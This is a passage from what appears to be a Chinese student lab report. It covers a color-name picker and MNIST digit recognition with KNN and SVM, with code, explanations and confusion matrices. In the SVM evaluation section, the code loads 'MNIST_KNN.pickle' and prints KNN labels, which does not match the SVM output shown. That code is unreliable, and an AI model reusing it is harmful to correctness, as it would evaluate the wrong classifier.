(minimumValue &gt;= <span class="number">600</span>):</span><br><span class="line">                cv2.putText(image, colorName, (<span class="number">50</span>, <span class="number">50</span>), <span class="number">2</span>, <span class="number">0.75</span>, (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">1</span>, cv2.FONT_ITALIC)</span><br><span class="line">            clicked = <span class="literal">False</span></span><br><span class="line">        cv2.imshow(<span class="string">&quot;Color Name&quot;</span>, image)</span><br><span class="line">        <span class="comment"># Break the loop when user hits &#x27;esc&#x27; key</span></span><br><span class="line">        <span class="keyword">if</span> cv2.waitKey(<span class="number">20</span>) &amp; <span class="number">0xFF</span> == <span class="number">27</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>


<h1 id="四、实验结果-3"><a href="#四、实验结果-3" class="headerlink" title="四、实验结果"></a>四、实验结果</h1><p>程序的运行结果与演示如下图所示：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346191.png" alt="image.png"><br>可以看到，输入的图片是vscode界面，当双击蓝色部分时，程序左上角出现了以蓝色为背景的文字“Selected color name is:-St. Patrick’s blue”。<br>而下方双击绿色部分，则显示绿色背景的文字“Selected color name is:-Old moss green”。<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346193.png" alt="image.png"></p>
<h1 id="五、实验分析-3"><a href="#五、实验分析-3" class="headerlink" title="五、实验分析"></a>五、实验分析</h1><p>该程序的稳定性较强，但在用户体验方面仍有改进之处：可以把双击某部分改成鼠标停留在哪就显示该处颜色。这样在用户体验上可能会更好。</p>
<h1 id="实验五"><a href="#实验五" class="headerlink" title="实验五"></a>实验五</h1><h1 id="一、实验目的-4"><a href="#一、实验目的-4" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>(1) 编写程序，基于机器学习和深度学习实现手写体的识别。<br>(2) 对实现的三个模型进行评估。<br>(3) 写出实验报告。</p>
<h1 id="二、实验原理-4"><a href="#二、实验原理-4" class="headerlink" title="二、实验原理"></a>二、实验原理</h1><p>(1)支持向量机（SVM）： 支持向量机是一种监督学习算法，用于二分类和多分类问题。在手写体识别任务中，S和VM可以被用来将手写数字图像分为不同的类别。SVM通过寻找一个最优的超平面来将不同类别的数据点分开。对于手写数字识别，每个图像被表示为一组特征向量，并与相应的标签（数字类别）相关联。SVM通过学习一个决策边界，使得不同类别的图像在特征空间中被最大化地分离。  </p>
<p>(2)K最近邻算法（K Nearest Neighbors）： K最近邻算法是一种基于实例的学习方法，用于分类和回归问题。对于手写体识别任务，K最近邻算法可以用于根据与目标图像最相似的K个训练样本的标签来预测目标图像的类别。算法通过计算目标图像与所有训练图像之间的距离（如欧氏距离）来确定最相似的训练样本，然后根据K个最相似样本的标签进行投票来确定目标图像的类别。   </p>
<p>(3) 随机森林分类器（Random Forest Classifier）： 随机森林是一种集成学习方法，它由多个决策树组成。每个决策树都是基于不同的训练样本和特征子集构建的。在手写体识别任务中，随机森林分类器可以通过将图像的特征输入到每个决策树中，并将决策树的预测结果进行投票来确定图像的类别。随机森林具有良好的泛化能力和抗过拟合能力，并且在处理高维特征空间和大规模数据集时表现良好</p>
<h1 id="三、实验内容和步骤-4"><a href="#三、实验内容和步骤-4" class="headerlink" title="三、实验内容和步骤"></a>三、实验内容和步骤</h1><h2 id="1-实验内容-4"><a href="#1-实验内容-4" class="headerlink" title="(1)实验内容"></a>(1)实验内容</h2><ol>
<li>用python编写程序，通过SVM、K Nearest Neighbors、Random Forest Classifier分别实现手写体的识别模型</li>
<li>分别评估模型</li>
</ol>
<h2 id="2-实验步骤-4"><a href="#2-实验步骤-4" class="headerlink" title="(2)实验步骤"></a>(2)实验步骤</h2><ol>
<li>基于K Nearest Neighbors实现</li>
<li>基于SVM实现</li>
<li>基于Random Forest Classifier实现</li>
</ol>
<p>具体步骤：</p>
<h4 id="1-基于K-Nearest-Neighbors实现"><a href="#1-基于K-Nearest-Neighbors实现" class="headerlink" title="1. 基于K Nearest Neighbors实现"></a>1. 基于K Nearest Neighbors实现</h4><h5 id="1-1-相关库的导入"><a href="#1-1-相关库的导入" class="headerlink" title="1.1 相关库的导入"></a>1.1 相关库的导入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> model_selection</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score, confusion_matrix</span><br><span class="line"><span class="keyword">from</span> MNIST_Dataset_Loader.mnist_loader <span class="keyword">import</span> MNIST</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> style</span><br><span class="line">style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="1-2-数据加载和准备"><a href="#1-2-数据加载和准备" class="headerlink" title="1.2 数据加载和准备"></a>1.2 数据加载和准备</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading MNIST Data...&#x27;</span>)</span><br><span class="line"><span class="comment"># data = MNIST(&#x27;./python-mnist/data/&#x27;)</span></span><br><span class="line"></span><br><span class="line">data = MNIST(<span class="string">&#x27;E:\MNIST_Dataset_Loader\dataset&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading Training Data...&#x27;</span>)</span><br><span class="line">img_train, labels_train = data.load_training()</span><br><span class="line">train_img = np.array(img_train)</span><br><span class="line">train_labels = np.array(labels_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading Testing Data...&#x27;</span>)</span><br><span class="line">img_test, labels_test = data.load_testing()</span><br><span class="line">test_img = np.array(img_test)</span><br><span class="line">test_labels = np.array(labels_test)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li>MNIST数据集是一个广泛使用的手写数字数据集，包含了大量的手写数字图像和相应的标签。</li>
<li>使用MNIST数据加载器加载训练数据和测试数据，并将其转换为NumPy数组。</li>
</ol>
<h5 id="1-3-创建和训练KNN分类器"><a href="#1-3-创建和训练KNN分类器" class="headerlink" title="1.3 创建和训练KNN分类器"></a>1.3 创建和训练KNN分类器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Features</span></span><br><span class="line">X = train_img</span><br><span class="line"></span><br><span class="line"><span class="comment">#Labels</span></span><br><span class="line">y = train_labels</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPreparing Classifier Training and Validation Data...&#x27;</span>)</span><br><span class="line">X_train, X_test, y_train, y_test = model_selection.train_test_split(X,y,test_size=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nKNN Classifier with n_neighbors = 5, algorithm = auto, n_jobs = 10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPickling the Classifier for Future Use...&#x27;</span>)</span><br><span class="line">clf = KNeighborsClassifier(n_neighbors=<span class="number">5</span>,algorithm=<span class="string">&#x27;auto&#x27;</span>,n_jobs=<span class="number">10</span>)</span><br><span class="line">clf.fit(X_train,y_train)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;MNIST_KNN.pickle&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	pickle.dump(clf, f)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li>使用<code>train_test_split</code>函数将训练数据划分为训练集和验证集。</li>
<li>使用<code>KNeighborsClassifier</code>类创建一个K最近邻分类器。</li>
<li>将训练图像作为特征（X）和对应的标签（y）传递给分类器，使用训练集对KNN分类器进行训练。</li>
<li>将训练好的分类器保存到文件中，以便将来使用。</li>
</ol>
<h5 id="1-4-验证和评估分类器"><a href="#1-4-验证和评估分类器" class="headerlink" title="1.4 验证和评估分类器"></a>1.4 验证和评估分类器</h5><p>在这部分代码中，首先使用<code>pickle.load</code>函数从文件中加载之前保存的KNN分类器对象。具体步骤如下：</p>
<ol>
<li>打开文件<code>MNIST_KNN.pickle</code>，以二进制读取模式进行操作。<code>&#39;rb&#39;</code>表示以二进制读取模式打开文件。</li>
<li>使用<code>pickle.load</code>函数从文件中加载KNN分类器对象，并将其赋值给变量<code>clf</code>。<br>具体代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pickle_in = <span class="built_in">open</span>(<span class="string">&#x27;MNIST_KNN.pickle&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">clf = pickle.load(pickle_in)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>接下来，先进行对已训练分类器的性能在验证数据集上的评估和预测：</p>
<p><strong>代码解析：</strong></p>
<ol>
<li>计算已训练分类器在验证数据集上的准确率。通过调用<code>clf.score(X_test, y_test)</code>方法，得到分类器在验证数据集上的准确率，将其赋值给变量<code>confidence</code>。</li>
<li>使用已训练分类器对验证数据集进行预测。通过调用<code>clf.predict(X_test)</code>方法，得到分类器对验证数据集的预测结果，将其赋值给变量<code>y_pred</code>。</li>
<li>计算预测结果的准确率。通过调用<code>accuracy_score(y_test, y_pred)</code>方法，计算分类器的预测准确率，将其赋值给变量<code>accuracy</code>。</li>
<li>创建并显示验证数据集的混淆矩阵。通过调用<code>confusion_matrix(y_test, y_pred)</code>方法，得到验证数据集的混淆矩阵，然后使用<code>plt.matshow</code>等函数绘制混淆矩阵的可视化。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of trained Classifier...&#x27;</span>)</span><br><span class="line">confidence = clf.score(X_test,y_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nMaking Predictions on Validation Data...&#x27;</span>)</span><br><span class="line">y_pred = clf.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of Predictions...&#x27;</span>)</span><br><span class="line">accuracy = accuracy_score(y_test, y_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCreating Confusion Matrix...&#x27;</span>)</span><br><span class="line">conf_mat = confusion_matrix(y_test,y_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nKNN Trained Classifier Confidence: &#x27;</span>,confidence)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPredicted Values: &#x27;</span>,y_pred)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nAccuracy of Classifier on Validation Image Data: &#x27;</span>,accuracy)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nConfusion Matrix: \n&#x27;</span>,conf_mat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Confusion Matrix Data as a Matrix</span></span><br><span class="line">plt.matshow(conf_mat)</span><br><span class="line">plt.title(<span class="string">&#x27;Confusion Matrix for Validation Data&#x27;</span>)</span><br><span class="line">plt.colorbar()</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True label&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted label&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>KNN Trained Classifier Confidence:  0.9738333333333333</code><br><code>Predicted Values:  [7 0 0 ... 8 2 1]</code><br><code>Accuracy of Classifier on Validation Image Data:  0.9738333333333333</code><br>Confusion Matrix:<br> [[568   0   0   0   0   0   1   1   0   0]<br> [  0 674   1   0   1   0   0   1   0   0]<br> [  1   6 585   1   1   1   2   9   0   0]<br> [  0   3   3 616   0   4   0   6   5   2]<br> [  0   3   0   0 564   0   1   1   0  14]<br> [  1   1   0   6   0 509   4   0   1   3]<br> [  2   3   0   0   0   8 605   0   0   0]<br> [  2   5   3   0   0   0   0 599   0   6]<br> [  0   9   0   6   2   5   1   0 547   7]<br> [  0   2   0   1   1   2   0   7   1 576]]</p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346845.png" alt="image.png"></p>
<p>然后进行对已训练分类器的性能在测试数据集上的评估和预测：</p>
<p><strong>代码解析：</strong></p>
<ol>
<li>使用已训练分类器对测试数据集进行预测。通过调用<code>clf.predict(test_img)</code>方法，得到分类器对测试数据集的预测结果，将其赋值给变量<code>test_labels_pred</code>。</li>
<li>计算已训练分类器在测试数据集上的准确率。通过调用<code>accuracy_score(test_labels, test_labels_pred)</code>方法，计算分类器在测试数据集上的预测准确率，将其赋值给变量<code>acc</code>。</li>
<li>创建并显示测试数据集的混淆矩阵。通过调用<code>confusion_matrix(test_labels, test_labels_pred)</code>方法，得到测试数据集的混淆矩阵，然后使用<code>plt.matshow</code>等函数绘制混淆矩阵的可视化。</li>
</ol>
<p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nMaking Predictions on Test Input Images...&#x27;</span>)</span><br><span class="line">test_labels_pred = clf.predict(test_img)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of Trained Classifier on Test Data... &#x27;</span>)</span><br><span class="line">acc = accuracy_score(test_labels,test_labels_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n Creating Confusion Matrix for Test Data...&#x27;</span>)</span><br><span class="line">conf_mat_test = confusion_matrix(test_labels,test_labels_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPredicted Labels for Test Images: &#x27;</span>,test_labels_pred)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nAccuracy of Classifier on Test Images: &#x27;</span>,acc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nConfusion Matrix for Test Data: \n&#x27;</span>,conf_mat_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Confusion Matrix for Test Data</span></span><br><span class="line">plt.matshow(conf_mat_test)</span><br><span class="line">plt.title(<span class="string">&#x27;Confusion Matrix for Test Data&#x27;</span>)</span><br><span class="line">plt.colorbar()</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True label&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted label&#x27;</span>)</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Predicted Labels for Test Images:  [7 2 1 ... 4 5 6]</code><br><code>Accuracy of Classifier on Test Images:  0.9675</code><br>Confusion Matrix for Test Data:<br> [[ 973    1    1    0    0    1    3    1    0    0]<br> [   0 1131    2    0    0    0    2    0    0    0]<br> [  11    8  989    2    1    0    1   16    4    0]<br> [   0    3    2  972    1   16    1    7    4    4]<br> [   3    6    0    0  944    0    4    2    1   22]<br> [   5    0    0   13    2  861    4    1    2    4]<br> [   5    4    0    0    3    2  944    0    0    0]<br> [   0   23    4    0    3    0    0  987    0   11]<br> [   7    3    5   13    6   15    4    5  911    5]<br> [   5    6    3    8    8    2    1   11    2  963]]</p>
<p><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346846.png" alt="image.png"></p>
<h5 id="1-5-显示预测结果"><a href="#1-5-显示预测结果" class="headerlink" title="1.5 显示预测结果"></a>1.5 显示预测结果</h5><p>随机选择一些测试图像，将原始标签和预测标签显示在图像上，以便观察分类器的预测效果。</p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Show the Test Images with Original and Predicted Labels</span></span><br><span class="line">a = np.random.randint(<span class="number">1</span>,<span class="number">50</span>,<span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">	two_d = (np.reshape(test_img[i], (<span class="number">28</span>, <span class="number">28</span>)) * <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">	plt.title(<span class="string">&#x27;Original Label: &#123;0&#125;  Predicted Label: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(test_labels[i],test_labels_pred[i]))</span><br><span class="line">	plt.imshow(two_d, interpolation=<span class="string">&#x27;nearest&#x27;</span>,cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">	plt.show()</span><br></pre></td></tr></table></figure>
<p>输出效果如下：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042346847.png" alt="image.png"></p>
<h4 id="2-基于SVM实现"><a href="#2-基于SVM实现" class="headerlink" title="2. 基于SVM实现"></a>2. 基于SVM实现</h4><h5 id="2-1-相关库的导入"><a href="#2-1-相关库的导入" class="headerlink" title="2.1 相关库的导入"></a>2.1 相关库的导入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> model_selection, svm, preprocessing</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score,confusion_matrix</span><br><span class="line"><span class="keyword">from</span> MNIST_Dataset_Loader.mnist_loader <span class="keyword">import</span> MNIST</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> style</span><br><span class="line">style.use(<span class="string">&#x27;ggplot&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="2-2-数据加载和准备"><a href="#2-2-数据加载和准备" class="headerlink" title="2.2 数据加载和准备"></a>2.2 数据加载和准备</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Load MNIST Data</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading MNIST Data...&#x27;</span>)</span><br><span class="line">data = MNIST(<span class="string">&#x27;E:\MNIST_Dataset_Loader\dataset&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading Training Data...&#x27;</span>)</span><br><span class="line">img_train, labels_train = data.load_training()</span><br><span class="line">train_img = np.array(img_train)</span><br><span class="line">train_labels = np.array(labels_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nLoading Testing Data...&#x27;</span>)</span><br><span class="line">img_test, labels_test = data.load_testing()</span><br><span class="line">test_img = np.array(img_test)</span><br><span class="line">test_labels = np.array(labels_test)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li>MNIST数据集是一个广泛使用的手写数字数据集，包含了大量的手写数字图像和相应的标签。</li>
<li>使用MNIST数据加载器加载训练数据和测试数据，并将其转换为NumPy数组。</li>
</ol>
<h5 id="2-3-创建和训练SVM分类器"><a href="#2-3-创建和训练SVM分类器" class="headerlink" title="2.3 创建和训练SVM分类器"></a>2.3 创建和训练SVM分类器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Features</span></span><br><span class="line">X = train_img</span><br><span class="line"></span><br><span class="line"><span class="comment">#Labels</span></span><br><span class="line">y = train_labels</span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare Classifier Training and Testing Data</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPreparing Classifier Training and Validation Data...&#x27;</span>)</span><br><span class="line">X_train, X_test, y_train, y_test = model_selection.train_test_split(X,y,test_size=<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pickle the Classifier for Future Use</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nSVM Classifier with gamma = 0.1; Kernel = polynomial&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPickling the Classifier for Future Use...&#x27;</span>)</span><br><span class="line">clf = svm.SVC(gamma=<span class="number">0.1</span>, kernel=<span class="string">&#x27;poly&#x27;</span>)</span><br><span class="line">clf.fit(X_train,y_train)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;MNIST_SVM.pickle&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	pickle.dump(clf, f)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li>使用<code>train_test_split</code>函数将训练数据划分为训练集和验证集。</li>
<li>使用<code>svm.SVC</code>类创建一个SVM分类器。</li>
<li>将训练图像作为特征（X）和对应的标签（y）传递给分类器，使用训练集对SVM分类器进行训练。</li>
<li>将训练好的分类器保存到文件中，以便将来使用。</li>
</ol>
<h5 id="2-4-验证和评估分类器"><a href="#2-4-验证和评估分类器" class="headerlink" title="2.4 验证和评估分类器"></a>2.4 验证和评估分类器</h5><p>在这部分代码中，首先使用<code>pickle.load</code>函数从文件中加载之前保存的SVM分类器对象。具体步骤如下：</p>
<ol>
<li>打开文件<code>MNIST_KNN.pickle</code>，以二进制读取模式进行操作。<code>&#39;rb&#39;</code>表示以二进制读取模式打开文件。</li>
<li>使用<code>pickle.load</code>函数从文件中加载KNN分类器对象，并将其赋值给变量<code>clf</code>。<br>具体代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pickle_in = <span class="built_in">open</span>(<span class="string">&#x27;MNIST_KNN.pickle&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">clf = pickle.load(pickle_in)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>接下来，先进行对已训练分类器的性能在验证数据集上的评估和预测：</p>
<p><strong>代码解析：</strong></p>
<ol>
<li>计算已训练分类器在验证数据集上的准确率。通过调用<code>clf.score(X_test, y_test)</code>方法，得到分类器在验证数据集上的准确率，将其赋值给变量<code>confidence</code>。</li>
<li>使用已训练分类器对验证数据集进行预测。通过调用<code>clf.predict(X_test)</code>方法，得到分类器对验证数据集的预测结果，将其赋值给变量<code>y_pred</code>。</li>
<li>计算预测结果的准确率。通过调用<code>accuracy_score(y_test, y_pred)</code>方法，计算分类器的预测准确率，将其赋值给变量<code>accuracy</code>。</li>
<li>创建并显示验证数据集的混淆矩阵。通过调用<code>confusion_matrix(y_test, y_pred)</code>方法，得到验证数据集的混淆矩阵，然后使用<code>plt.matshow</code>等函数绘制混淆矩阵的可视化。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of trained Classifier...&#x27;</span>)</span><br><span class="line">confidence = clf.score(X_test,y_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nMaking Predictions on Validation Data...&#x27;</span>)</span><br><span class="line">y_pred = clf.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCalculating Accuracy of Predictions...&#x27;</span>)</span><br><span class="line">accuracy = accuracy_score(y_test, y_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nCreating Confusion Matrix...&#x27;</span>)</span><br><span class="line">conf_mat = confusion_matrix(y_test,y_pred)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nKNN Trained Classifier Confidence: &#x27;</span>,confidence)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nPredicted Values: &#x27;</span>,y_pred)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nAccuracy of Classifier on Validation Image Data: &#x27;</span>,accuracy)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\nConfusion Matrix: \n&#x27;</span>,conf_mat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Plot Confusion Matrix Data as a Matrix</span></span><br><span class="line">plt.matshow(conf_mat)</span><br><span class="line">plt.title(<span class="string">&#x27;Confusion Matrix for Validation Data&#x27;</span>)</span><br><span class="line">plt.colorbar()</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True label&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Predicted label&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>SVM Trained Classifier Accuracy:  0.9808333333333333</code><br><code>Predicted Values:  [3 3 3 ... 1 8 7]</code><br><code>Accuracy of Classifier on Validation Images:  0.9808333333333333</code><br>Confusion Matrix:<br> [[599   0   2   0   0   1   2   0   0   0]<br> [  0 677   4   2   0   0   1   0   1   0]<br> [  1   1 585   1   0   0   1   6   1   1]<br> [  2   0   4 593   0   3   0   1   3   2]<br> [  1   0   1   0 560   0   0   0   2   4]<br> [  0   1   1   1   0 524   2   0   4   1]<br> [  3   0   0   0   1   2 545   0   0   0]<br> [  0   3   2   1   2   2   0 665   1   4]<br> [  3   2   1   5   1   4   3   0 545   2]<br> [  1   1   0   4   3   2   0   4   0 592]]</p>
